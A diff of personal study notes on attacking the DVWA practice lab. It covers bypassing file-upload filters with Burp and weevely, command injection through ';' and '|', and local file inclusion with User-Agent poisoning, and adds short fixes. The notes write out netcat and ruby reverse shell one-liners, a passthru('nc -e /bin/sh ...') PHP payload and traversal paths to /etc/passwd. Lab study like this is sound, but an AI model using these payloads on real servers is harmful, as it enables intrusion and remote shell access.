@@ -100,30 +100,35 @@ In Burp go to the intercept tab, and now what ever the link is accessed on brows
 We can modify the packets also and Forward the data when we want until then the page would not be accessed on the browser
 Burp Suite here works like a client side proxy
 
-Step 6 -> 
-We can use burp suite also as we can change the files name back to php in headers and then forward the packet // this helps to bypass
-the file type filter
-If it is also checking the extension then change the file name as shell.php.jpg and we can use it in same way like weevly as ->
-weevely url_for_place_where_shell.php.jpg ur_password_for_file   // it will run in same way
+Step 6 -> Set dvwa security to Medium and try upload the shell
 
     ByPass Medium File Upload Security ->
    - change the name of the file extension from php to jpg
-   - Intercept the packet and change the packet back from the jpg to php
+   - Intercept the packet and change the packet back from the jpg to php using burp
 
+We can use burp suite also as we can change the files name back to php in headers and then forward the packet // this helps to bypass
+the file type filter
+
+Step 7-> Set dvwa security to high
 ByPass High File Upload Security ->
    - In medium only the file type was checked but here the extension of file is also checked
    - change the name of the file extension as payload.php.jpg with burp Suite while intercepting
    - Intercept the packet and change the packet back from the jpg to php
+
+If it is also checking the extension then change the file name as shell.php.jpg and we can use it in same way like weevly as ->
+weevely url_for_place_where_shell.php.jpg ur_password_for_file   // it will run in same way
 
 Fixing the File Upload Vulnebility issue ->
 Things to keep in mind ->
 - Never allow people to upload executables such as bash script or php file etc
 - Check the file type and the file extension
 - analyse the uploaded file urself, and recreate it and rename it and delete the old image  // their r libraries for this task we
-should always use them, such as in php their is php-Imagick
+should always use them, such as in php their is php-Imagick // show the source code of high security to demonstrate it
 
 #(03) Code Execution Vulnebilities -> This allows an attacker to execute OS commands we can upload any file using the wget command
 another way of exploiting this vulnebility is to just run OS cmds and get a reverse shell based on those commands
+
+Screenshot(469)
 
 - Always go through the website to get an idea about it and check for the input boxes that how can u exploit them
 
@@ -131,6 +136,7 @@ Such as suppose we r allowing to do ping and execute an cmd ping and input box i
 as in the linux and unix based systems we can enter multiple cmds by using ';' Now if the extra cmds r being executed then it is
 code execution vulnebilites
 
+Step 1-> Set security level to low
 In the attacker terminal cmd -> nc -vv -l -p 8080 // this uses netcat, Netcat is a tool that allows u to connect and listen 
 computers together
 
@@ -162,6 +168,8 @@ ruby -rsocket -e'f=TCPSocket.open("10.20.14",8080).to_i;exec sprintf("/bin/sh -i
 Netcat
 nc -e /bin/sh 10.20.14 8080
 
+Step 2 -> Set security level to medium
+
 If their is no code executable vulrnebality or using filter then we can use pipe such as ->  ping input_ip | pwd// 2nd cmd after pipe
 sign will give us shell on the server in this case it won't because we r using pwd so it will just give the path, here the output
 will be displayed only of the 2nd command means the pwd or command after '|'
@@ -171,21 +179,22 @@ we can use pipe as cmd -> ping input_ip | nc -e /bin/sh 10.20.14 8080 // now it 
 How to Fix Code execution vulnebilities ->
 Things to remember ->
 - Don't allow users to execute any code on the server // if u have to use it then make sure u analyse the input such as use regex etc
-
 - In medium level security the filters must be applied to filter out ';' as a countermeasure to prevent above attack
-- In high level security the proper security implementation is done 
+- In high level security the proper security implementation is done to provide the mitigation.
 
 Note -> If u r still connected to the machine using above method u will notice that u r not able to navigate through browser on that
         app
 
-#(04)Local File Inclusion -> these allows u to read any file within the same server also the files outside the www directory
+#(04)Local File Inclusion -> Screenshot(470)
+
+- these allows u to read any file within the same server also the files outside the 'www' directory
 
 Note -> If some other website is installed on same server and ur target website does not have this vulnerability but the other
 website has then u can use other website Local File vulnerability exploit to read files of ur target website
 
-= we can exploit this vulnebility through URL
+- we can exploit this vulnebility through URL
 
-Steps -> Go to the web page and see the URL in my example u will see include.php is loaded
+Step1 -> Go to the web page and see the URL in my example u will see include.php is loaded
 -> to check for the file is available go to new tab and enter as 10..../dvwa/vulnerabilities/fi/include.php and u will get the path
 where the file is present, here instead of quering it as '?page=include.php' in URL we r entering the full path to check if file
 is available
@@ -196,19 +205,25 @@ to know from above step see how many times u needed to go back
 go out of 5 folders as the path to include.php file is in 5 folders as /var/www/dvwa/vulnerabilities/fi/include.php displayed 
 during our above check for File Inclusion vulnerability
 
+- Screenshot(471)
+
+- Use the high level security for proper migitation of this attack
+
     We can use other things in place of /etc/passwd such as->
     - /proc/self/environ  // this contains the info about the current environment
     - /var/log/auth.log
     - /var/log/apache2/access.log
 
-    USER AGENT refers to the browser used by the user
+    - USER AGENT refers to the browser used by the user
 
+Step 2 ->
 - In the browser (let the intercept on for the burp suite) enter the url ->
 10.0.2.4/dvwa/vulnerabilities/fi/?page=/../../../../../proc/self/environ
 - then go to the burp suite and in the headers and see the User Agent and edit it as <?phpinfo();?> , then forward the packet
 - then on the browser u will see that PHP related information is displayed which means u can send code // this also means u can send
 any php code such as code to list files, code to upload a file
 
+Step 3 ->
 - To get reverse connection
 - in the attacker terminal ->  nc -vv -l -p 8080
 - again intercept the url 10.0.2.4/dvwa/vulnerabilities/fi/?page=/../../../../../proc/self/environ through burp suite and edit the 
@@ -216,7 +231,7 @@ User agent
 - put this in user agent <?passthru("nc -e /bin/sh 10.20.14 8080");?> // we use passthru to run the unix cmds on the server
 - and u will see that the connection is established and fire the linux cmds
 
-    Other way to gain Shell access from Local File Inclusion Vulnerability is as follows ->
+Step 3 ->  Other way to gain Shell access from Local File Inclusion Vulnerability is as follows ->
 
 - In the browser (let the intercept on for the burp suite) enter the url ->
 10.0.2.4/dvwa/vulnerabilities/fi/?page=/../../../../../var/log/auth.log //this will display all login attempts
